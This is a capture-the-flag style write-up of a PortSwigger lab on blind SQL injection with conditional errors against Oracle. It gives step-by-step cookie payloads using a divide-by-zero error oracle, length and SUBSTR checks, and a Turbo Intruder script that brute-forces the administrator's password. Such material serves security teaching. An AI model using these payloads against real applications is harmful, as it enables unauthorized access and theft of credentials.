Lab: Blind SQL injection with conditional errors
Category: SQL Injection (Blind)
Platform: PortSwigger Web Academy
Database: Oracle
URL: portswigger.net/web-security/sql-injection/blind/lab-conditional-errors

Goal: Exploit blind SQLi via TrackingId cookie — no direct output, no "Welcome back" signal either; instead, a SQL error (triggered conditionally) is the only oracle. Extract administrator's password and log in.

Vulnerability: TrackingId cookie value is concatenated into a backend Oracle SQL query. The app shows a generic 500 error whenever the query is malformed/throws a runtime error, and 200 OK otherwise. This lets an attacker trigger errors conditionally using CASE WHEN ... THEN TO_CHAR(1/0) ELSE '' END — a true condition causes a divide-by-zero error, a false one doesn't.

Steps:

1. Confirmed injection point:

TrackingId=<val>'    → 500 error (broken syntax)
TrackingId=<val>''   → 200 OK (syntax balanced)

2. Confirmed SQL context + Oracle database:

TrackingId=<val>'||(SELECT '')||'                → error (Oracle needs explicit table)
TrackingId=<val>'||(SELECT '' FROM dual)||'       → no error → confirms Oracle (dual = dummy table)
TrackingId=<val>'||(SELECT '' FROM not-a-real-table)||'  → error → confirms genuine SQL injection

3. Confirmed users table exists (needed ROWNUM = 1 to avoid multi-row concatenation break):

TrackingId=<val>'||(SELECT '' FROM users WHERE ROWNUM = 1)||'   → 200 OK

4. Verified the conditional-error oracle itself:

CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual   → 500 (true → error)
CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual   → 200 (false → no error)

5. Confirmed administrator user exists:

...WHERE username='administrator')||'   → 500 error → user exists

6. Determined password length via incremental LENGTH(password)>N checks → confirmed length = 20.

7. Used Turbo Intruder (Community edition Intruder throttled) to brute-force each character via SUBSTR(password,POS,1)='%s':

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=5,
                            requestsPerConnection=100,
                            pipeline=False)

    chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    for c in chars:
        engine.queue(target.req, c)

def handleResponse(req, interesting):
    table.add(req)

8. For each position (1–20), checked Status column directly — the row showing 500 (not length comparison this time) revealed the correct character, since error = true condition.

9. Repeated for all 20 positions, reconstructed full password, logged in as administrator → lab Solved.